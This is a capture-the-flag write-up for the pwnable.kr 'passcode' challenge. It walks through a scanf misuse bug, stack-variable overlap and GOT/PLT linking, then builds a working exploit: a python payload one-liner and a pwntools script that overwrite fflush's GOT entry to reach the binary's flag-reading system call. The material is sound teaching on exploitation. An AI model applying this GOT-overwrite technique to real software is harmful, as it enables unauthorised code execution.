---
layout: article
title:  "passcode - pwnable.kr"
date:   2021-09-24 02:30:53 +0  530
tags:
  - writeup
  - pwnable.kr
  - GOT
  - PLT
  - linker
  - pwntools
---

> Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that? 
ssh [passcode@pwnable.kr](mailto:passcode@pwnable.kr) -p2222 (pw:guest)
> 

![Untitled](/assets/images/posts/passcode//Untitled.png)

So on the ssh server we have three files, we can download `passcode` and `passcode.c` to better examine them

```bash
❯ scp -P 2222 passcode@pwnable.kr:~/passcode.c ./ 
passcode@pwnable.kr's password: 
passcode.c                                          100%  858     2.1KB/s   00:00
```

You can't just download the flag file tho 

![Untitled](/assets/images/posts/passcode//Untitled%201.png)

content of `passcode.c`

```cpp
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

on running the binary we get `segementation fault`

```bash
❯ ./passcode 
Toddler's Secure Login System 1.0 beta.
enter you name : heya
Welcome heya!
enter passcode1 : 23234
enter passcode2 : 22332
[1]    4773 segmentation fault  ./passcode
```

On examining the c code properly, you can see that the `scanf` function is passed the variable itself, and not the address of the variable. So it tries to write the entered data into the address formed by the value of `passcode1` (which is a garbage value as its not initialized) and since it might not be an actual address, it gives segmentation fault.

So it seems we need to set the variables as `passcode1==338150 && passcode2==13371337` to read the flag. 

How do we go about this? we see there is a function `welcome` called before `login` and it takes input of 100 characters

If we examine using `gdb`, we find that both of the above function share the same stack base pointer

```c
Breakpoint 1, 0x08048612 in welcome ()
gdb-peda$ info frame
Stack level 0, frame at 0xffdb3730:
 eip = 0x8048612 in welcome; saved eip = 0x804867f
 called by frame at 0xffdb3750
 Arglist at 0xffdb3728, args: 
 Locals at 0xffdb3728, Previous frame's sp is 0xffdb3730
 Saved registers:
  ebp at 0xffdb3728, eip at 0xffdb372c

Breakpoint 2, 0x0804856a in login ()
gdb-peda$ info frame
Stack level 0, frame at 0xffdb3730:
 eip = 0x804856a in login; saved eip = 0x8048684
 called by frame at 0xffdb3750
 Arglist at 0xffdb3728, args: 
 Locals at 0xffdb3728, Previous frame's sp is 0xffdb3730
 Saved registers:
  ebp at 0xffdb3728, eip at 0xffdb372c
```

So we might be able to use the `name` variable to overwrite `passcode1` and `passcode2`

Let us see the address of these variables

```c
gdb-peda$ disas welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:	push   ebp
   0x0804860a <+1>:	mov    ebp,esp
   0x0804860c <+3>:	sub    esp,0x88
   0x08048612 <+9>:	mov    eax,gs:0x14
   0x08048618 <+15>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804861b <+18>:	xor    eax,eax
   0x0804861d <+20>:	mov    eax,0x80487cb
   0x08048622 <+25>:	mov    DWORD PTR [esp],eax
   0x08048625 <+28>:	call   0x8048420 <printf@plt>
   0x0804862a <+33>:	mov    eax,0x80487dd
   0x0804862f <+38>:	lea    edx,[ebp-0x70]  <====================== name
   0x08048632 <+41>:	mov    DWORD PTR [esp+0x4],edx
   0x08048636 <+45>:	mov    DWORD PTR [esp],eax
   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:	mov    eax,0x80487e3
   0x08048643 <+58>:	lea    edx,[ebp-0x70]
   0x08048646 <+61>:	mov    DWORD PTR [esp+0x4],edx
   0x0804864a <+65>:	mov    DWORD PTR [esp],eax
   0x0804864d <+68>:	call   0x8048420 <printf@plt>
   0x08048652 <+73>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048655 <+76>:	xor    eax,DWORD PTR gs:0x14
   0x0804865c <+83>:	je     0x8048663 <welcome+90>
   0x0804865e <+85>:	call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:	leave  
   0x08048664 <+91>:	ret    
End of assembler dump.
gdb-peda$ disas login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   ebp
   0x08048565 <+1>:	mov    ebp,esp
   0x08048567 <+3>:	sub    esp,0x28
   0x0804856a <+6>:	mov    eax,0x8048770
   0x0804856f <+11>:	mov    DWORD PTR [esp],eax
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    eax,0x8048783
   0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10] <==================== passcode1
   0x0804857f <+27>:	mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:	mov    DWORD PTR [esp],eax
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    eax,ds:0x804a02c
   0x08048590 <+44>:	mov    DWORD PTR [esp],eax
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    eax,0x8048786
   0x0804859d <+57>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    eax,0x8048783
   0x080485aa <+70>:	mov    edx,DWORD PTR [ebp-0xc] <=================== passcode2
   0x080485ad <+73>:	mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	mov    DWORD PTR [esp],0x80487bd
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	mov    DWORD PTR [esp],0x0
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
```

Looking at the assembly we can see that `name` is at `ebp-0x70` , `passcode1` at `ebp-0x10` and `passcode2` at `ebp-0xc`

Examining the addresses an offset

```c
gdb-peda$ p $ebp-0x70
$1 = (void *) 0xffdb36b8   # address of name
gdb-peda$ p $ebp-0x10
$2 = (void *) 0xffdb3718
gdb-peda$ p $ebp-0xc
$3 = (void *) 0xffdb371c
gdb-peda$ p/d ($ebp-0x70) - ($ebp-0x10)
$4 = -96
gdb-peda$ p/d ($ebp-0x70) - ($ebp-0xc)
$5 = -100
```

We can see that passcode1 is at an offset of 96 and passcode2 of 100, so we can use name to overwrite the first variable but not the second one. So we can't just make both variables to our desired values.

---

Now, some theory about linking functions dynamically and statically

[GOT and PLT for pwning. - System Overlord](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)

[Global Offset Table and Procedure Linkage Table - 04](https://www.youtube.com/watch?v=E2-E_fQ13Xs)

So thing is that, functions like `printf` are declared in libc, so you can either statically include the library in the binary (which will increase the size), or you can link the library dynamically during execution(which is the preferred way).

For executing the `printf` function, the binary needs to know its address, which has to be looked up during runtime.

> `.plt` These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to .got.plt yet.)
> 

> `.got.plt` This is the GOT for the PLT. It contains the target addresses (after they have been looked up) or an address back in the .plt to trigger the lookup. Classically, this data was part of the .got section.
> 

So when printf is called, it will go to `.plt` section and it will further jump to the address specified in the `.got.plt` section (this section will contain the actual address of printf). If it is the first time being called, .got.plt will return to .plt which will find then call a routine that will update .got.plt with actuall address of printf.

We can exploit this by overwriting the got with custom function address. But for this `Partial Relro` must be there.(instead of Full Relro) - protection against overwriting .got.plt 

```c
**❯ checksec passcode**
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/walt/.cache/.pwntools-cache-3.9/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.6.0)
[*] '/home/walt/Downloads/pwnabl/passcode/passcode'
    Arch:     i386-32-little
    RELRO:    **Partial RELRO**
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

---

```c
gdb-peda$ disas 0x8048430
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:	jmp    DWORD PTR ds:0x804a004
   0x08048436 <+6>:	push   0x8
   0x0804843b <+11>:	jmp    0x8048410
End of assembler dump.
```

Here `0x804a004` is the address of .got.plt section which will jump back to .plt intially and once printf address has been decoded, it is written in the .got.plt section

We can overwrite the content of `0x804a004` address with anything to execute that instead , when fflush is called.

So what all information do we have,

- we can overwrite `passcode1`
- `fflush` can be used to execute custom instuctions (`system` command here).
- Partial RELRO is enabled

So we will use `name` to overwrite `passcode1` with the address `0x804a004`, then we will use scanf to write `0x080485e3` (in base10 form, since %d in scanf) at `0x804a004` as its where system call to read flag starts.

```c
0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
0x080485ea <+134>:	call   0x8048460 <system@plt>
```

`0x080485e3` ⇒ **134514147**

so this is our exploit

```c
**❯ python -c "print '\x01'*96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcode**
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome !
**/bin/cat: flag: No such file or directory**
enter passcode1 : Now I can safely trust you that you have credential :)
```

we can login on the ssh server and do the above, or below is a script using [pwntools](https://www.notion.so/pwntools-0b8a5451f8ab4452900f2931df2b652f) to do the same

```python
from pwn import *
context.log_level = 'debug' # makes it more verbose

# ssh passcode@pwnable.kr -p2222 (pw:guest)
session = ssh(host='pwnable.kr',user='passcode', port=2222,password='guest')

# Executes a process on the remote server
process = session.process(executable='./passcode')

# create payload
fflush = 0x804a004
syscommand = 0x080485e3

pl = b'a'*96
pl += p32(fflush)
pl += str(int(syscommand)).encode('ascii')

# send payload
print(process.recvline())
process.sendline(pl)
print(process.recvall())
process.close()
```

```python
[DEBUG] Received 0xe7 bytes:
    00000000  57 65 6c 63  6f 6d 65 20  61 61 61 61  61 61 61 61  │Welc│ome │aaaa│aaaa│
    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000060  61 61 61 61  61 61 61 61  04 a0 04 08  21 0a 53 6f  │aaaa│aaaa│····│!·So│
    00000070  72 72 79 20  6d 6f 6d 2e  2e 20 49 20  67 6f 74 20  │rry │mom.│. I │got │
    00000080  63 6f 6e 66  75 73 65 64  20 61 62 6f  75 74 20 73  │conf│used│ abo│ut s│
    00000090  63 61 6e 66  20 75 73 61  67 65 20 3a  28 0a 65 6e  │canf│ usa│ge :│(·en│
    000000a0  74 65 72 20  70 61 73 73  63 6f 64 65  31 20 3a 20  │ter │pass│code│1 : │
    000000b0  4e 6f 77 20  49 20 63 61  6e 20 73 61  66 65 6c 79  │Now │I ca│n sa│fely│
    000000c0  20 74 72 75  73 74 20 79  6f 75 20 74  68 61 74 20  │ tru│st y│ou t│hat │
    000000d0  79 6f 75 20  68 61 76 65  20 63 72 65  64 65 6e 74  │you │have│ cre│dent│
    000000e0  69 61 6c 20  3a 29 0a                               │ial │:)·│
    000000e7
[*] Stopped remote process 'passcode' on pwnable.kr (pid 48142)
b'enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x04\xa0\x04\x08!\nSorry mom.. I got confused about scanf usage :(\nenter passcode1 : Now I can safely trust you that you have credential :)\n'
```

**References** 

- [https://jaimelightfoot.com/blog/pwnable-kr-passcode-walkthrough/](https://jaimelightfoot.com/blog/pwnable-kr-passcode-walkthrough/)
- [https://medium.com/@0x9090/pwnable-kr-passcode-writeup-2fdfd9fec283](https://medium.com/@0x9090/pwnable-kr-passcode-writeup-2fdfd9fec283)